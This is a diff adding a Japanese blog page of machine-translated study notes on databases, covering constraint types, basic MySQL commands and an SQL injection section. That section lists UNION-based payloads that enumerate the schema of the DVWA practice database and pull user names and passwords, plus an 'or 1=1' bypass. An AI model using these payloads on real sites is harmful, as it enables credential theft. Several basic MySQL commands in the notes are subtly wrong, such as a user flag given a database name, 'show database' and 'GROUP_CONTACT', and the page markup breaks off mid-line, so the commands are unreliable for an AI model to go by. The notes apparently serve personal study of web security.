@@ -1,0 +1,597 @@
+  <!DOCTYPE html>
+  <html lang="ja"  data-theme-mode="auto">
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)","en":"Copy successfully (*^▽^*)","ja":"コピー成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ","en":"Copy failed (ﾟ⊿ﾟ)ﾂ","ja":"コピー失敗 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://blog.wray7.top';window.REIMU_CONFIG.relative = '/';window.REIMU_CONFIG.i18n_languages = ["en","ja"];window.REIMU_CONFIG.dark_mode = {"button":true,"mode":"auto"};</script>
+  <title>
+    データベース | Wray的Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="この記事は中国語から AI により機械翻訳されたものです。正確性については中国語の原文を参照してください。   リレーショナル：表と似ている mysql、Oracle、microsoft sql server、acess 非リレーショナル：分散型で、ACID 原則の遵守を保証しない。MongoDb、Redis、HBase  制約の種類 主キー制約（primary key）：このフィールドが非 N">
+<meta property="og:type" content="article">
+<meta property="og:title" content="データベース">
+<meta property="og:url" content="https://blog.wray7.top/ja/2023/09/04/2023-09-04-%E6%95%B0%E6%8D%AE%E5%BA%93.ja/index.html">
+<meta property="og:site_name" content="Wray的Blog">
+<meta property="og:description" content="この記事は中国語から AI により機械翻訳されたものです。正確性については中国語の原文を参照してください。   リレーショナル：表と似ている mysql、Oracle、microsoft sql server、acess 非リレーショナル：分散型で、ACID 原則の遵守を保証しない。MongoDb、Redis、HBase  制約の種類 主キー制約（primary key）：このフィールドが非 N">
+<meta property="og:locale" content="ja_JP">
+<meta property="article:published_time" content="2023-09-03T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-10-10T20:47:33.346Z">
+<meta property="article:author" content="Wray Lee">
+<meta property="article:tag" content="Sql">
+<meta name="twitter:card" content="summary">
+      <meta name="keywords" content="技术, 笔记, 折腾, 教程">
+    <link rel="alternate" href="/atom.xml" title="Wray的Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.3/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/ja/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">ホーム</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/ja/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">アーカイブ</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/ja/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">プロフィール</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS フィード" aria-label="RSS フィード" target="_blank"></a>
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="検索" aria-label="検索"></a>
+  </nav>
+    <nav id="i18n-nav" aria-label="Language selection">
+      <div class="custom-dropdown">
+        <div class="select-selected" id="select-selected" role="button" aria-haspopup="listbox" aria-expanded="false" aria-label="Language menu">
+          <span id="nav-language-btn" class="nav-icon" style="padding: 0 20px 0 0"></span>
+          <span id="selected-lang">日本語</span>
+        </div>
+        <ul class="select-items" id="select-items" role="listbox" aria-label="Languages">
+            <li data-value="zh-CN" role="option" aria-selected="false">简体中文</li>
+            <li data-value="en" role="option" aria-selected="false">English</li>
+            <li data-value="ja" role="option" class="selected" aria-selected="true">日本語</li>
+        </ul>
+      </div>
+      <script>
+        var selectSelected = document.getElementById("select-selected");
+        var selectedLang = document.getElementById("selected-lang");
+        var selectItems = document.getElementById("select-items");
+        var selectOptions = selectItems.querySelectorAll("li");
+
+        selectSelected.addEventListener("click", () => {
+          selectItems.classList.toggle("show");
+          var expanded = selectSelected.getAttribute("aria-expanded") === "true";
+          selectSelected.setAttribute("aria-expanded", (!expanded).toString());
+        });
+
+        selectOptions.forEach((item) => {
+          item.addEventListener("click", () => {
+            const langMap = {};
+              langMap['zh-CN'] = '/2023/09/04/2023-09-04-数据库.ja/';
+              langMap['en'] = '/en/2023/09/04/2023-09-04-数据库.ja/';
+              langMap['ja'] = '/ja/2023/09/04/2023-09-04-数据库.ja/';
+            selectedLang.textContent = item.textContent;
+            selectItems.classList.remove("show");
+            selectOptions.forEach((option) => {
+              option.classList.remove("selected");
+            });
+            item.classList.add("selected");
+            window.location = langMap[item.dataset.value];
+          });
+        });
+
+        document.addEventListener("click", (event) => {
+          if (!event.target.closest(".custom-dropdown")) {
+            selectItems.classList.remove("show");
+            selectSelected.setAttribute("aria-expanded", "false");
+          }
+        });
+      </script>
+    </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img onerror="this.onerror=null;this.src='/images/banner.webp'"  fetchpriority="high" src="https://www.dmoe.cc/random.php" alt="データベース">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">データベース</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">見出し</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%B6%E7%B4%84%E3%81%AE%E7%A8%AE%E9%A1%9E"><span class="toc-number">1.</span> <span class="toc-text">制約の種類</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mysql"><span class="toc-number"></span> <span class="toc-text">Mysql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9"><span class="toc-number">1.</span> <span class="toc-text">データベース</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E3%81%B8%E3%81%AE%E6%8E%A5%E7%B6%9A"><span class="toc-number">1.1.</span> <span class="toc-text">データベースへの接続</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AE%E7%85%A7%E4%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">データベースの照会</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AE%E4%BD%9C%E6%88%90"><span class="toc-number">1.3.</span> <span class="toc-text">データベースの作成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AE%E5%89%8A%E9%99%A4"><span class="toc-number">1.4.</span> <span class="toc-text">データベースの削除</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AB%E5%85%A5%E3%82%8B"><span class="toc-number">1.5.</span> <span class="toc-text">データベースに入る</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB-table"><span class="toc-number"></span> <span class="toc-text">テーブル table</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB%E3%81%AE%E7%85%A7%E4%BC%9A"><span class="toc-number">0.1.</span> <span class="toc-text">テーブルの照会</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB%E8%A8%98%E8%BF%B0%E3%81%AE%E8%A1%A8%E7%A4%BA"><span class="toc-number">0.2.</span> <span class="toc-text">テーブル記述の表示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%BD%E5%8A%A0%E3%83%BB%E5%89%8A%E9%99%A4%E3%83%BB%E7%85%A7%E4%BC%9A%E3%83%BB%E6%9B%B4%E6%96%B0"><span class="toc-number">0.3.</span> <span class="toc-text">追加・削除・照会・更新</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3"><span class="toc-number"></span> <span class="toc-text">SQLインジェクション</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.</span> <span class="toc-text">注入位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#union"><span class="toc-number">2.</span> <span class="toc-text">union</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E3%83%95%E3%83%AD%E3%83%BC"><span class="toc-number">3.</span> <span class="toc-text">注入フロー</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AE%E7%A8%AE%E9%A1%9E%E3%82%92%E8%AA%BF%E3%81%B9%E3%82%8B"><span class="toc-number">4.</span> <span class="toc-text">データベースの種類を調べる</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AE%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB%E5%86%85%E5%AE%B9%E3%82%92%E7%85%A7%E4%BC%9A%E3%81%99%E3%82%8B"><span class="toc-number">5.</span> <span class="toc-text">データベースのテーブル内容を照会する</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%97%E5%90%8D%E3%82%92%E8%AA%BF%E3%81%B9%E3%82%8B"><span class="toc-number">6.</span> <span class="toc-text">列名を調べる</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%83%85%E5%A0%B1%E3%82%92%E8%AA%BF%E3%81%B9%E3%82%8B"><span class="toc-number">7.</span> <span class="toc-text">情報を調べる</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%81%99%E3%81%B9%E3%81%A6%E3%81%AE%E3%83%87%E3%83%BC%E3%82%BF%E3%82%92%E8%BF%94%E3%81%99"><span class="toc-number">8.</span> <span class="toc-text">すべてのデータを返す</span></a></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.png" data-sizes="auto" alt="Wray Lee" class="lazyload">
+  <div class="sidebar-author-name">Wray Lee</div>
+  <div class="sidebar-description">Wray Lee 的技术笔记：折腾、备忘与学习记录</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>投稿</div>
+    <div class="sidebar-state-number">778</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>カテゴリー</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>タグ</div>
+    <div class="sidebar-state-number">26</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/wray-lee itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/ja/" aria-label="ホーム"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">ホーム</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/ja/archives" aria-label="アーカイブ"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">アーカイブ</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/ja/about" aria-label="プロフィール"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">プロフィール</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-2023-09-04-数据库.ja" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2023-09-03T16:00:00.000Z" itemprop="datePublished">2023-09-04</time>
+    <time style="display: none;" id="post-update-time">2026-10-11</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <blockquote>
+<p>この記事は中国語から AI により機械翻訳されたものです。正確性については中国語の原文を参照してください。</p>
+</blockquote>
+<ul>
+<li>リレーショナル：表と似ている mysql、Oracle、microsoft sql server、acess</li>
+<li>非リレーショナル：分散型で、ACID 原則の遵守を保証しない。MongoDb、Redis、HBase</li>
+</ul>
+<h2 id="制約の種類"><a href="#制約の種類" class="headerlink" title="制約の種類"></a>制約の種類</h2><ol>
+<li>主キー制約（primary key）：このフィールドが非 NULL かつ一意であることを保証する。1 つの表には主キーを 1 つだけ持つことができ、主キーは表中のフィールドの一意識別子である。</li>
+<li>NOT NULL 制約（not null）：フィールドが空でないことを保証する。</li>
+<li>一意制約（unique）：このフィールドが一意であることを保証するが、NULL になることは可能である。</li>
+<li>外部キー制約（foreign key）：ある表に存在する別の表の主キーまたは一意キーが、この表の外部キーになる。</li>
+<li>デフォルト制約（default）：このフィールドにデフォルト値があることを保証する。</li>
+</ol>
+<h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><h2 id="データベース"><a href="#データベース" class="headerlink" title="データベース"></a>データベース</h2><h3 id="データベースへの接続"><a href="#データベースへの接続" class="headerlink" title="データベースへの接続"></a>データベースへの接続</h3><p><code>mysql -u [database_name] -p [password]</code></p>
+<h3 id="データベースの照会"><a href="#データベースの照会" class="headerlink" title="データベースの照会"></a>データベースの照会</h3><p><code>show database</code></p>
+<h3 id="データベースの作成"><a href="#データベースの作成" class="headerlink" title="データベースの作成"></a>データベースの作成</h3><p><code>create [database_name]</code></p>
+<h3 id="データベースの削除"><a href="#データベースの削除" class="headerlink" title="データベースの削除"></a>データベースの削除</h3><p><code>drop [database_name]</code></p>
+<h3 id="データベースに入る"><a href="#データベースに入る" class="headerlink" title="データベースに入る"></a>データベースに入る</h3><p><code>use [database_name]</code></p>
+<h1 id="テーブル-table"><a href="#テーブル-table" class="headerlink" title="テーブル table"></a>テーブル table</h1><h3 id="テーブルの照会"><a href="#テーブルの照会" class="headerlink" title="テーブルの照会"></a>テーブルの照会</h3><p><code>show tables</code></p>
+<h3 id="テーブル記述の表示"><a href="#テーブル記述の表示" class="headerlink" title="テーブル記述の表示"></a>テーブル記述の表示</h3><p><code>desc [table_name]</code></p>
+<h3 id="追加・削除・照会・更新"><a href="#追加・削除・照会・更新" class="headerlink" title="追加・削除・照会・更新"></a>追加・削除・照会・更新</h3><ul>
+<li>追加：<code>insert into 表名(键1,键2……) values(值1,值2……)</code></li>
+</ul>
+<p>複数組のフィールド <code>insert into 表名(key1,key2……) values(value1,value2)(value3,value4)</code></p>
+<ul>
+<li>更新：<code>update 表名 set 键名=&#39;值&#39; where 条件(列值)</code></li>
+<li>削除：</li>
+</ul>
+<p>物理削除：<code>delete from 表名 where 条件 </code></p>
+<p>論理削除</p>
+<ul>
+<li>照会：</li>
+</ul>
+<p><code>select *(列名) from 表名</code></p>
+<p><code>select 列 from 表 where 条件 </code></p>
+<p><code>select 列 from 表 by 某列 ASC(升序)/DESC（降序）</code></p>
+<p><code>select GROUP_CONTACT(列) from 表 where</code> クエリ結果を行形式で表示</p>
+<p><code>select 列 from 表 order by 数字</code> 表示するキーの数。既存より大きいとエラー、小さいと正常に表示</p>
+<p><code>select 列 from 表 limit 5 </code> 先頭 5 行の表示を制限</p>
+<p><code>select 列 from 表 limit 5(偏移量)，10(显示行数) </code> 6～15 行目の表示を制限</p>
+<p><code>select 数字（其他任意内容）,数字（其他任意内容）…… </code> 表示位置に応じて入力内容を出力する。<strong>データベースのエコーバック列数は固定であり、表示位置を満たす場合にのみエコーバックされる</strong></p>
+<h1 id="SQLインジェクション"><a href="#SQLインジェクション" class="headerlink" title="SQLインジェクション"></a>SQLインジェクション</h1><h2 id="注入位置"><a href="#注入位置" class="headerlink" title="注入位置"></a>注入位置</h2><p>注入位置：GET、POST、HEAD ヘッダー</p>
+<hr>
+<p>文字列は単一引用符で囲まれ、数値は単一引用符で囲まれない</p>
+<p>単一引用符は # でコメントアウトできる</p>
+<h2 id="union"><a href="#union" class="headerlink" title="union"></a>union</h2><p>union キーワード。結合クエリで、2 つの select 文を 1 つの文に結合し、1 つの結果として表示する。</p>
+<p>結合クエリでは、2 つの select は同じフィールド数でなければならない（union はクエリ対象の表の列数とフィールド型が一致することを要求する）</p>
+<p><code>union all</code> すべてのデータを直接結合する</p>
+<p><code>union</code> 結合後のデータを重複排除する</p>
+<p><code>information_schema</code> フィールド情報を照会する</p>
+<h2 id="注入フロー"><a href="#注入フロー" class="headerlink" title="注入フロー"></a>注入フロー</h2><ol>
+<li>データベースの種類を照会する（エラー、datebase（））</li>
+<li>データベース名を調べる</li>
+<li>テーブル名を調べる</li>
+<li>列名を調べる</li>
+<li>情報を取得する</li>
+</ol>
+<h2 id="データベースの種類を調べる"><a href="#データベースの種類を調べる" class="headerlink" title="データベースの種類を調べる"></a>データベースの種類を調べる</h2><p><code>select * from 表名 where id=&#39;1&#39; union select 1,database()</code></p>
+<h2 id="データベースのテーブル内容を照会する"><a href="#データベースのテーブル内容を照会する" class="headerlink" title="データベースのテーブル内容を照会する"></a>データベースのテーブル内容を照会する</h2><p><code>0&#39; union select 1,table_name from information_schema.tables where table_schema=&#39;dvwa</code></p>
+<h2 id="列名を調べる"><a href="#列名を調べる" class="headerlink" title="列名を調べる"></a>列名を調べる</h2><p><code>0&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users</code></p>
+<h2 id="情報を調べる"><a href="#情報を調べる" class="headerlink" title="情報を調べる"></a>情報を調べる</h2><p><code>0&#39; union select user,password from users#</code></p>
+<h2 id="すべてのデータを返す"><a href="#すべてのデータを返す" class="headerlink" title="すべてのデータを返す"></a>すべてのデータを返す</h2><p><code>select * from 表明 where id=1 or 1=1</code></p>
+
+    </div>
+    <footer class="article-footer">
+      
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/ja/tags/Sql/" rel="tag" title="Sql">Sql</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2019-2026
+        <span class="footer-info-sep rotate"></span>
+      Wray Lee
+    </div>
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        538k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        49:10
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">総閲覧数&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">総閲覧者数&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">見出し</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%B6%E7%B4%84%E3%81%AE%E7%A8%AE%E9%A1%9E"><span class="toc-number">1.</span> <span class="toc-text">制約の種類</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mysql"><span class="toc-number"></span> <span class="toc-text">Mysql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9"><span class="toc-number">1.</span> <span class="toc-text">データベース</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E3%81%B8%E3%81%AE%E6%8E%A5%E7%B6%9A"><span class="toc-number">1.1.</span> <span class="toc-text">データベースへの接続</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AE%E7%85%A7%E4%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">データベースの照会</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AE%E4%BD%9C%E6%88%90"><span class="toc-number">1.3.</span> <span class="toc-text">データベースの作成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AE%E5%89%8A%E9%99%A4"><span class="toc-number">1.4.</span> <span class="toc-text">データベースの削除</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AB%E5%85%A5%E3%82%8B"><span class="toc-number">1.5.</span> <span class="toc-text">データベースに入る</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB-table"><span class="toc-number"></span> <span class="toc-text">テーブル table</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB%E3%81%AE%E7%85%A7%E4%BC%9A"><span class="toc-number">0.1.</span> <span class="toc-text">テーブルの照会</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB%E8%A8%98%E8%BF%B0%E3%81%AE%E8%A1%A8%E7%A4%BA"><span class="toc-number">0.2.</span> <span class="toc-text">テーブル記述の表示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%BD%E5%8A%A0%E3%83%BB%E5%89%8A%E9%99%A4%E3%83%BB%E7%85%A7%E4%BC%9A%E3%83%BB%E6%9B%B4%E6%96%B0"><span class="toc-number">0.3.</span> <span class="toc-text">追加・削除・照会・更新</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3"><span class="toc-number"></span> <span class="toc-text">SQLインジェクション</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.</span> <span class="toc-text">注入位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#union"><span class="toc-number">2.</span> <span class="toc-text">union</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E3%83%95%E3%83%AD%E3%83%BC"><span class="toc-number">3.</span> <span class="toc-text">注入フロー</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AE%E7%A8%AE%E9%A1%9E%E3%82%92%E8%AA%BF%E3%81%B9%E3%82%8B"><span class="toc-number">4.</span> <span class="toc-text">データベースの種類を調べる</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AE%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB%E5%86%85%E5%AE%B9%E3%82%92%E7%85%A7%E4%BC%9A%E3%81%99%E3%82%8B"><span class="toc-number">5.</span> <span class="toc-text">データベースのテーブル内容を照会する</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%97%E5%90%8D%E3%82%92%E8%AA%BF%E3%81%B9%E3%82%8B"><span class="toc-number">6.</span> <span class="toc-text">列名を調べる</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%83%85%E5%A0%B1%E3%82%92%E8%AA%BF%E3%81%B9%E3%82%8B"><span 